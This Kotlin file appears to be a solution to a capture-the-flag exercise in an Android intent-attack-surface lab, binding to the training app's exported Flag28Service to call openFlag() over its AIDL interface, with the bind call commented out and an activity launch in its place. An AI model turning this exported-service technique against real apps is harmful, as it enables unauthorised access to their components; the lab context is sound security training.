package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.IBinder
import android.util.Log
import io.hextree.attacksurface.services.IFlag28Interface

object Flag28 {
    fun getFlag(context: Context) {
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag28Service"
            )
        }

        val mConnection = object : ServiceConnection {
            override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                Log.d("Fla28", "service connected")
                val remoteService = IFlag28Interface.Stub.asInterface(service)
                try {
                    remoteService.openFlag()
                } catch (e: Error) {
                    Log.e("Flag28", e.message.toString())
                }
            }

            override fun onServiceDisconnected(name: ComponentName?) {
                Log.d("Fla28", "service disconnected")
            }
        }

//        context.bindService(intent, mConnection, Context.BIND_AUTO_CREATE)
        val flag28ActivityIntent = Intent().apply {
            component = ComponentName(
                "com.pachinko.intentattacksurface",
                "com.pachinko.intentattacksurface.Flag28Activity"
            )
        }
        context.startActivity(flag28ActivityIntent)
    }
}
